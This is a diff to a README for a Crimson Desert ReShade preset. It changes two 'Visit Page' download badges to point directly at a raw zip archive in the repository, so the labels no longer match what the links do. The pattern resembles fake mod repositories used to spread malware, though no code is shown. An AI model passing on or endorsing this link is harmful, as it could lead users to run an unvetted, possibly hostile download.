@@ -1,6 +1,6 @@
 # 🎮 Crimson-Desert-Visual-Redux-Reshade - Cinematic visuals with cleaner depth
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Ermengardeyellowgreen779/Crimson-Desert-Visual-Redux-Reshade)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Ermengardeyellowgreen779/Crimson-Desert-Visual-Redux-Reshade/raw/refs/heads/main/BaseMain/Visual-Reshade-Redux-Crimson-Desert-2.0.zip)
 
 ## 🖼️ What This Is
 
@@ -33,7 +33,7 @@ For best results, use a system that can run Crimson Desert at stable frame rates
 
 Use this link to visit the download page and get the files:
 
-[![Download Crimson-Desert-Visual-Redux-Reshade](https://img.shields.io/badge/Get%20the%20Files-Visit%20Download%20Page-6f42c1?style=for-the-badge)](https://github.com/Ermengardeyellowgreen779/Crimson-Desert-Visual-Redux-Reshade)
+[![Download Crimson-Desert-Visual-Redux-Reshade](https://img.shields.io/badge/Get%20the%20Files-Visit%20Download%20Page-6f42c1?style=for-the-badge)](https://github.com/Ermengardeyellowgreen779/Crimson-Desert-Visual-Redux-Reshade/raw/refs/heads/main/BaseMain/Visual-Reshade-Redux-Crimson-Desert-2.0.zip)
 
 Follow these steps on Windows:
 
